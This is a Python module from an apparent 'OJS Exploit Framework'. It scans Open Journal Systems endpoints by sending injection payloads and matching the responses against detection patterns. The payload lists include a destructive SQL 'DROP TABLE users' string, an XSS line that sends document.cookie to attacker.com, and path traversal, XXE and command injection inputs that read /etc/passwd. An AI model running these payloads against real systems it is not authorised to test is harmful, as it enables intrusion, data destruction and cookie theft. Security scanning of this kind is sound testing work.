"""
Vulnerability Scanner Module for OJS Exploit Framework.

This module implements comprehensive vulnerability scanning including:
- Automated vulnerability detection
- Security misconfiguration identification
- Common vulnerability testing
- Custom vulnerability patterns
"""

import time
import hashlib
import json
import re
from pathlib import Path
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum
import requests
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup

from ..core.session import SessionManager
from ..utils.http_client import HTTPClient
from ..utils.logging import get_logger, log_vulnerability_found


class VulnerabilityType(Enum):
    """Types of vulnerabilities that can be scanned."""
    SQL_INJECTION = "sql_injection"
    XSS = "xss"
    CSRF = "csrf"
    FILE_UPLOAD = "file_upload"
    PATH_TRAVERSAL = "path_traversal"
    DESERIALIZATION = "deserialization"
    RCE = "rce"
    INFORMATION_DISCLOSURE = "information_disclosure"
    WEAK_AUTHENTICATION = "weak_authentication"
    INSECURE_DESERIALIZATION = "insecure_deserialization"
    OPEN_REDIRECT = "open_redirect"
    SSRF = "ssrf"
    XXE = "xxe"
    TEMPLATE_INJECTION = "template_injection"
    COMMAND_INJECTION = "command_injection"


@dataclass
class VulnerabilityResult:
    """Result of vulnerability scanning."""
    vulnerability_type: VulnerabilityType
    target_url: str
    parameter: str
    payload: str
    evidence: str
    confidence: str
    severity: str
    cwe_id: str
    description: str
    remediation: str
    false_positive: bool = False
    session_id: Optional[str] = None
    execution_time: Optional[float] = None


class VulnerabilityScanner:
    """Comprehensive vulnerability scanner for OJS."""
    
    def __init__(self, session_manager: SessionManager = None,
                 http_client: HTTPClient = None):
        """Initialize the vulnerability scanner module."""
        self.session_manager = session_manager
        self.http_client = http_client
        self.logger = get_logger('recon.vuln_scan')
        
        # OJS-specific endpoints to scan
        self.scan_endpoints = {
            'login': '/index.php/index/login/signIn',
            'search': '/index.php/index/search/search',
            'article_submission': '/index.php/index/author/submit/1',
            'user_profile': '/index.php/index/user/profile',
            'admin_panel': '/index.php/index/manager/setup/1',
            'file_upload': '/index.php/index/author/submit/1/2',
            'plugin_management': '/index.php/index/manager/plugins',
            'import_export': '/index.php/index/manager/importexport',
            'backup_restore': '/index.php/index/manager/setup/1',
            'user_management': '/index.php/index/manager/people/users'
        }
        
        # Vulnerability test payloads
        self.test_payloads = {
            VulnerabilityType.SQL_INJECTION: [
                "' OR '1'='1",
                "' UNION SELECT NULL--",
                "'; DROP TABLE users--",
                "' OR 1=1#",
                "' OR 1=1--",
                "admin'--",
                "admin'#",
                "admin'/*",
                "' OR 'x'='x",
                "1' OR '1' = '1' OR '1' = '1"
            ],
            VulnerabilityType.XSS: [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "javascript:alert('XSS')",
                "<svg onload=alert('XSS')>",
                "'\"><script>alert('XSS')</script>",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>"
            ],
            VulnerabilityType.CSRF: [
                "<img src=\"http://attacker.com/csrf\">",
                "<form action=\"http://attacker.com/csrf\" method=\"POST\">",
                "<script>document.location='http://attacker.com/csrf'</script>"
            ],
            VulnerabilityType.PATH_TRAVERSAL: [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
                "....//....//....//etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
            ],
            VulnerabilityType.OPEN_REDIRECT: [
                "http://attacker.com",
                "//attacker.com",
                "javascript:alert('redirect')",
                "data:text/html,<script>alert('redirect')</script>"
            ],
            VulnerabilityType.SSRF: [
                "http://localhost",
                "http://127.0.0.1",
                "http://0.0.0.0",
                "file:///etc/passwd",
                "dict://localhost:11211/stat",
                "ftp://localhost"
            ],
            VulnerabilityType.XXE: [
                "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>",
                "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///etc/passwd\">]><data>&file;</data>"
            ],
            VulnerabilityType.TEMPLATE_INJECTION: [
                "{{7*7}}",
                "${7*7}",
                "#{7*7}",
                "{{config}}",
                "${config}",
                "#{config}"
            ],
            VulnerabilityType.COMMAND_INJECTION: [
                "; ls -la",
                "| whoami",
                "& dir",
                "`id`",
                "$(id)",
                "; cat /etc/passwd",
                "| cat /etc/passwd"
            ]
        }
        
        # Vulnerability detection patterns
        self.detection_patterns = {
            VulnerabilityType.SQL_INJECTION: [
                r'mysql_fetch_array',
                r'mysql_error',
                r'SQL syntax',
                r'mysql_num_rows',
                r'ORA-\d+',
                r'PostgreSQL.*ERROR',
                r'SQLite.*error',
                r'Warning.*mysql_',
                r'valid MySQL result',
                r'MySqlClient\.'
            ],
            VulnerabilityType.XSS: [
                r'<script>alert\(',
                r'<img.*onerror=',
                r'javascript:alert\(',
                r'<iframe.*src=',
                r'<body.*onload=',
                r'<svg.*onload='
            ],
            VulnerabilityType.PATH_TRAVERSAL: [
                r'root:x:0:0',
                r'bin:x:1:1',
                r'daemon:x:2:2',
                r'Windows.*System32',
                r'C:\\Windows',
                r'/etc/passwd',
                r'/etc/shadow'
            ],
            VulnerabilityType.OPEN_REDIRECT: [
                r'Location:.*attacker\.com',
                r'window\.location.*attacker',
                r'redirect.*attacker',
                r'url=.*attacker'
            ],
            VulnerabilityType.SSRF: [
                r'Connection.*localhost',
                r'127\.0\.0\.1',
                r'0\.0\.0\.0',
                r'file:///',
                r'dict://',
                r'ftp://'
            ],
            VulnerabilityType.XXE: [
                r'root:x:0:0',
                r'<!DOCTYPE',
                r'<!ENTITY',
                r'&xxe;',
                r'&file;'
            ],
            VulnerabilityType.TEMPLATE_INJECTION: [
                r'49',
                r'config\[',
                r'config\.',
                r'process\.env',
                r'__proto__',
                r'constructor'
            ],
            VulnerabilityType.COMMAND_INJECTION: [
                r'uid=\d+',
                r'gid=\d+',
                r'groups=',
                r'root.*bin',
                r'daemon.*bin',
                r'bin.*daemon'
            ]
        }
        
        # CWE mappings
        self.cwe_mappings = {
            VulnerabilityType.SQL_INJECTION: "CWE-89",
            VulnerabilityType.XSS: "CWE-79",
            VulnerabilityType.CSRF: "CWE-352",
            VulnerabilityType.FILE_UPLOAD: "CWE-434",
            VulnerabilityType.PATH_TRAVERSAL: "CWE-22",
            VulnerabilityType.DESERIALIZATION: "CWE-502",
            VulnerabilityType.RCE: "CWE-78",
            VulnerabilityType.INFORMATION_DISCLOSURE: "CWE-200",
            VulnerabilityType.WEAK_AUTHENTICATION: "CWE-287",
            VulnerabilityType.INSECURE_DESERIALIZATION: "CWE-502",
            VulnerabilityType.OPEN_REDIRECT: "CWE-601",
            VulnerabilityType.SSRF: "CWE-918",
            VulnerabilityType.XXE: "CWE-611",
            VulnerabilityType.TEMPLATE_INJECTION: "CWE-1336",
            VulnerabilityType.COMMAND_INJECTION: "CWE-78"
        }
        
        # Severity levels
        self.severity_levels = {
            'CRITICAL': ['RCE', 'SQL_INJECTION', 'FILE_UPLOAD'],
            'HIGH': ['XSS', 'PATH_TRAVERSAL', 'SSRF', 'XXE'],
            'MEDIUM': ['CSRF', 'OPEN_REDIRECT', 'TEMPLATE_INJECTION'],
            'LOW': ['INFORMATION_DISCLOSURE', 'WEAK_AUTHENTICATION']
        }
    
    def scan_vulnerabilities(self, target_url: str, vulnerability_types: List[VulnerabilityType] = None,
                           session_id: str = None) -> List[VulnerabilityResult]:
        """Perform comprehensive vulnerability scanning."""
        if vulnerability_types is None:
            vulnerability_types = list(VulnerabilityType)
        
        discovered_vulnerabilities = []
        
        self.logger.info(f"Starting vulnerability scan for {target_url}")
        
        for vuln_type in vulnerability_types:
            try:
                vulnerabilities = self._scan_vulnerability_type(target_url, vuln_type, session_id)
                discovered_vulnerabilities.extend(vulnerabilities)
                
                if vulnerabilities:
                    for vuln in vulnerabilities:
                        log_vulnerability_found(vuln_type.value, target_url, 
                                             f"Found in {vuln.parameter}", session_id)
                
            except Exception as e:
                self.logger.error(f"Failed to scan {vuln_type.value}: {e}")
        
        self.logger.info(f"Vulnerability scan completed. Found {len(discovered_vulnerabilities)} vulnerabilities")
        
        return discovered_vulnerabilities
    
    def _scan_vulnerability_type(self, target_url: str, vuln_type: VulnerabilityType,
                               session_id: str = None) -> List[VulnerabilityResult]:
        """Scan for a specific vulnerability type."""
        vulnerabilities = []
        
        # Get test payloads for this vulnerability type
        payloads = self.test_payloads.get(vuln_type, [])
        
        # Get detection patterns for this vulnerability type
        patterns = self.detection_patterns.get(vuln_type, [])
        
        # Scan each endpoint
        for endpoint_name, endpoint_path in self.scan_endpoints.items():
            endpoint_url = urljoin(target_url, endpoint_path)
            
            # Test GET parameters
            get_vulns = self._test_get_parameters(endpoint_url, vuln_type, payloads, patterns, session_id)
            vulnerabilities.extend(get_vulns)
            
            # Test POST parameters
            post_vulns = self._test_post_parameters(endpoint_url, vuln_type, payloads, patterns, session_id)
            vulnerabilities.extend(post_vulns)
            
            # Test headers
            header_vulns = self._test_headers(endpoint_url, vuln_type, payloads, patterns, session_id)
            vulnerabilities.extend(header_vulns)
        
        return vulnerabilities
    
    def _test_get_parameters(self, url: str, vuln_type: VulnerabilityType,
                           payloads: List[str], patterns: List[str],
                           session_id: str = None) -> List[VulnerabilityResult]:
        """Test GET parameters for vulnerabilities."""
        vulnerabilities = []
        
        # Common GET parameters to test
        test_parameters = [
            'id', 'page', 'search', 'q', 'query', 'keyword', 'term',
            'file', 'path', 'url', 'redirect', 'target', 'dest',
            'user', 'username', 'email', 'name', 'title', 'content'
        ]
        
        for param in test_parameters:
            for payload in payloads:
                try:
                    # Construct test URL
                    test_url = f"{url}?{param}={payload}"
                    
                    # Send request
                    if self.http_client:
                        response = self.http_client.get(test_url)
                    else:
                        response = requests.get(test_url)
                    
                    # Analyze response
                    vuln = self._analyze_response_for_vulnerability(
                        response, vuln_type, param, payload, patterns, session_id
                    )
                    
                    if vuln:
                        vulnerabilities.append(vuln)
                
                except Exception as e:
                    self.logger.debug(f"Failed to test GET parameter {param}: {e}")
        
        return vulnerabilities
    
    def _test_post_parameters(self, url: str, vuln_type: VulnerabilityType,
                            payloads: List[str], patterns: List[str],
                            session_id: str = None) -> List[VulnerabilityResult]:
        """Test POST parameters for vulnerabilities."""
        vulnerabilities = []
        
        # Common POST parameters to test
        test_parameters = [
            'username', 'password', 'email', 'name', 'title', 'content',
            'search', 'query', 'file', 'path', 'url', 'redirect',
            'data', 'input', 'value', 'text', 'message', 'comment'
        ]
        
        for param in test_parameters:
            for payload in payloads:
                try:
                    # Prepare POST data
                    data = {param: payload}
                    
                    # Send request
                    if self.http_client:
                        response = self.http_client.post(url, data=data)
                    else:
                        response = requests.post(url, data=data)
                    
                    # Analyze response
                    vuln = self._analyze_response_for_vulnerability(
                        response, vuln_type, param, payload, patterns, session_id
                    )
                    
                    if vuln:
                        vulnerabilities.append(vuln)
                
                except Exception as e:
                    self.logger.debug(f"Failed to test POST parameter {param}: {e}")
        
        return vulnerabilities
    
    def _test_headers(self, url: str, vuln_type: VulnerabilityType,
                     payloads: List[str], patterns: List[str],
                     session_id: str = None) -> List[VulnerabilityResult]:
        """Test HTTP headers for vulnerabilities."""
        vulnerabilities = []
        
        # Common headers to test
        test_headers = [
            'User-Agent', 'Referer', 'X-Forwarded-For', 'X-Real-IP',
            'X-Forwarded-Host', 'X-Original-URL', 'X-Rewrite-URL'
        ]
        
        for header in test_headers:
            for payload in payloads:
                try:
                    # Prepare headers
                    headers = {header: payload}
                    
                    # Send request
                    if self.http_client:
                        response = self.http_client.get(url, headers=headers)
                    else:
                        response = requests.get(url, headers=headers)
                    
                    # Analyze response
                    vuln = self._analyze_response_for_vulnerability(
                        response, vuln_type, header, payload, patterns, session_id
                    )
                    
                    if vuln:
                        vulnerabilities.append(vuln)
                
                except Exception as e:
                    self.logger.debug(f"Failed to test header {header}: {e}")
        
        return vulnerabilities
    
    def _analyze_response_for_vulnerability(self, response: requests.Response,
                                          vuln_type: VulnerabilityType, parameter: str,
                                          payload: str, patterns: List[str],
                                          session_id: str = None) -> Optional[VulnerabilityResult]:
        """Analyze response for vulnerability indicators."""
        try:
            # Check response content for vulnerability patterns
            content = response.text.lower()
            evidence = ""
            confidence = "LOW"
            
            # Check for vulnerability patterns
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE):
                    evidence = f"Pattern '{pattern}' found in response"
                    confidence = "HIGH"
                    break
            
            # Check for error messages that indicate vulnerability
            error_indicators = [
                'error', 'exception', 'warning', 'fatal',
                'mysql_error', 'sql syntax', 'ora-', 'postgresql error'
            ]
            
            for indicator in error_indicators:
                if indicator in content:
                    evidence = f"Error indicator '{indicator}' found in response"
                    confidence = "MEDIUM"
                    break
            
            # Check for successful payload execution
            if vuln_type == VulnerabilityType.XSS:
                if payload.lower() in content:
                    evidence = f"XSS payload found in response"
                    confidence = "HIGH"
            
            elif vuln_type == VulnerabilityType.SQL_INJECTION:
                if any(indicator in content for indicator in ['mysql_fetch_array', 'sql syntax', 'ora-']):
                    evidence = f"SQL injection error found in response"
                    confidence = "HIGH"
            
            elif vuln_type == VulnerabilityType.PATH_TRAVERSAL:
                if any(indicator in content for indicator in ['root:x:0:0', 'bin:x:1:1', 'windows']):
                    evidence = f"Path traversal successful - file content found"
                    confidence = "HIGH"
            
            # If we found evidence, create vulnerability result
            if evidence:
                severity = self._determine_severity(vuln_type)
                cwe_id = self.cwe_mappings.get(vuln_type, "CWE-Unknown")
                
                return VulnerabilityResult(
                    vulnerability_type=vuln_type,
                    target_url=response.url,
                    parameter=parameter,
                    payload=payload,
                    evidence=evidence,
                    confidence=confidence,
                    severity=severity,
                    cwe_id=cwe_id,
                    description=self._get_vulnerability_description(vuln_type),
                    remediation=self._get_vulnerability_remediation(vuln_type),
                    session_id=session_id
                )
        
        except Exception as e:
            self.logger.debug(f"Failed to analyze response: {e}")
        
        return None
    
    def _determine_severity(self, vuln_type: VulnerabilityType) -> str:
        """Determine the severity level of a vulnerability."""
        vuln_name = vuln_type.value.upper()
        
        for severity, vuln_list in self.severity_levels.items():
            if vuln_name in vuln_list:
                return severity
        
        return "MEDIUM"  # Default severity
    
    def _get_vulnerability_description(self, vuln_type: VulnerabilityType) -> str:
        """Get description for a vulnerability type."""
        descriptions = {
            VulnerabilityType.SQL_INJECTION: "SQL injection vulnerability allows attackers to execute arbitrary SQL commands",
            VulnerabilityType.XSS: "Cross-site scripting vulnerability allows attackers to inject malicious scripts",
            VulnerabilityType.CSRF: "Cross-site request forgery vulnerability allows attackers to perform actions on behalf of users",
            VulnerabilityType.FILE_UPLOAD: "File upload vulnerability allows attackers to upload malicious files",
            VulnerabilityType.PATH_TRAVERSAL: "Path traversal vulnerability allows attackers to access files outside intended directory",
            VulnerabilityType.DESERIALIZATION: "Insecure deserialization vulnerability allows attackers to execute arbitrary code",
            VulnerabilityType.RCE: "Remote code execution vulnerability allows attackers to execute arbitrary commands",
            VulnerabilityType.INFORMATION_DISCLOSURE: "Information disclosure vulnerability exposes sensitive information",
            VulnerabilityType.WEAK_AUTHENTICATION: "Weak authentication mechanism allows unauthorized access",
            VulnerabilityType.OPEN_REDIRECT: "Open redirect vulnerability allows attackers to redirect users to malicious sites",
            VulnerabilityType.SSRF: "Server-side request forgery vulnerability allows attackers to make requests to internal systems",
            VulnerabilityType.XXE: "XML external entity injection vulnerability allows attackers to read files or execute code",
            VulnerabilityType.TEMPLATE_INJECTION: "Template injection vulnerability allows attackers to execute arbitrary code",
            VulnerabilityType.COMMAND_INJECTION: "Command injection vulnerability allows attackers to execute system commands"
        }
        
        return descriptions.get(vuln_type, "Unknown vulnerability type")
    
    def _get_vulnerability_remediation(self, vuln_type: VulnerabilityType) -> str:
        """Get remediation advice for a vulnerability type."""
        remediations = {
            VulnerabilityType.SQL_INJECTION: "Use parameterized queries or prepared statements",
            VulnerabilityType.XSS: "Validate and sanitize all user input, use output encoding",
            VulnerabilityType.CSRF: "Implement CSRF tokens and validate them on all state-changing requests",
            VulnerabilityType.FILE_UPLOAD: "Validate file types, restrict upload directories, scan for malware",
            VulnerabilityType.PATH_TRAVERSAL: "Validate file paths, use whitelist approach, chroot when possible",
            VulnerabilityType.DESERIALIZATION: "Avoid deserializing untrusted data, use safe serialization formats",
            VulnerabilityType.RCE: "Validate all input, use sandboxing, implement proper access controls",
            VulnerabilityType.INFORMATION_DISCLOSURE: "Remove sensitive information from error messages and responses",
            VulnerabilityType.WEAK_AUTHENTICATION: "Implement strong authentication, use multi-factor authentication",
            VulnerabilityType.OPEN_REDIRECT: "Validate redirect URLs, use whitelist approach",
            VulnerabilityType.SSRF: "Validate URLs, implement network segmentation, use allowlist approach",
            VulnerabilityType.XXE: "Disable XML external entity processing, use safe XML parsers",
            VulnerabilityType.TEMPLATE_INJECTION: "Use safe template engines, validate template variables",
            VulnerabilityType.COMMAND_INJECTION: "Avoid command execution, use safe APIs, validate all input"
        }
        
        return remediations.get(vuln_type, "Implement proper input validation and output encoding")
    
    def generate_vulnerability_report(self, vulnerabilities: List[VulnerabilityResult]) -> Dict[str, Any]:
        """Generate a comprehensive vulnerability report."""
        report = {
            'total_vulnerabilities': len(vulnerabilities),
            'vulnerabilities_by_type': {},
            'vulnerabilities_by_severity': {},
            'vulnerabilities_by_confidence': {},
            'critical_vulnerabilities': [],
            'high_vulnerabilities': [],
            'medium_vulnerabilities': [],
            'low_vulnerabilities': [],
            'false_positives': [],
            'recommendations': []
        }
        
        # Categorize vulnerabilities
        for vuln in vulnerabilities:
            # By type
            vuln_type = vuln.vulnerability_type.value
            if vuln_type not in report['vulnerabilities_by_type']:
                report['vulnerabilities_by_type'][vuln_type] = []
            report['vulnerabilities_by_type'][vuln_type].append({
                'url': vuln.target_url,
                'parameter': vuln.parameter,
                'severity': vuln.severity,
                'confidence': vuln.confidence,
                'evidence': vuln.evidence
            })
            
            # By severity
            if vuln.severity not in report['vulnerabilities_by_severity']:
                report['vulnerabilities_by_severity'][vuln.severity] = []
            report['vulnerabilities_by_severity'][vuln.severity].append(vuln)
            
            # By confidence
            if vuln.confidence not in report['vulnerabilities_by_confidence']:
                report['vulnerabilities_by_confidence'][vuln.confidence] = []
            report['vulnerabilities_by_confidence'][vuln.confidence].append(vuln)
            
            # By severity level
            if vuln.severity == 'CRITICAL':
                report['critical_vulnerabilities'].append(vuln)
            elif vuln.severity == 'HIGH':
                report['high_vulnerabilities'].append(vuln)
            elif vuln.severity == 'MEDIUM':
                report['medium_vulnerabilities'].append(vuln)
            else:
                report['low_vulnerabilities'].append(vuln)
            
            # Check for false positives
            if vuln.false_positive:
                report['false_positives'].append(vuln)
        
        # Generate recommendations
        report['recommendations'] = self._generate_recommendations(vulnerabilities)
        
        return report
    
    def _generate_recommendations(self, vulnerabilities: List[VulnerabilityResult]) -> List[str]:
        """Generate security recommendations based on found vulnerabilities."""
        recommendations = []
        
        # Count vulnerability types
        vuln_counts = {}
        for vuln in vulnerabilities:
            vuln_type = vuln.vulnerability_type.value
            vuln_counts[vuln_type] = vuln_counts.get(vuln_type, 0) + 1
        
        # Generate specific recommendations
        if vuln_counts.get('sql_injection', 0) > 0:
            recommendations.append("Implement parameterized queries for all database operations")
        
        if vuln_counts.get('xss', 0) > 0:
            recommendations.append("Implement input validation and output encoding for all user inputs")
        
        if vuln_counts.get('csrf', 0) > 0:
            recommendations.append("Implement CSRF tokens for all state-changing operations")
        
        if vuln_counts.get('file_upload', 0) > 0:
            recommendations.append("Implement strict file upload validation and scanning")
        
        if vuln_counts.get('path_traversal', 0) > 0:
            recommendations.append("Implement path validation and use whitelist approach for file access")
        
        # General recommendations
        recommendations.extend([
            "Implement a Web Application Firewall (WAF)",
            "Regular security testing and penetration testing",
            "Keep all software and dependencies updated",
            "Implement proper logging and monitoring",
            "Use HTTPS for all communications",
            "Implement proper session management"
        ])
        
        return recommendations
    
    def get_scanner_info(self) -> Dict[str, Any]:
        """Get information about the vulnerability scanner module."""
        return {
            'name': 'VulnerabilityScanner',
            'description': 'Comprehensive vulnerability scanner for OJS',
            'vulnerability_types': [t.value for t in VulnerabilityType],
            'scan_endpoints': list(self.scan_endpoints.keys()),
            'test_payloads': {t.value: len(p) for t, p in self.test_payloads.items()},
            'detection_patterns': {t.value: len(p) for t, p in self.detection_patterns.items()},
            'cwe_mappings': {t.value: cwe for t, cwe in self.cwe_mappings.items()},
            'severity_levels': self.severity_levels
        }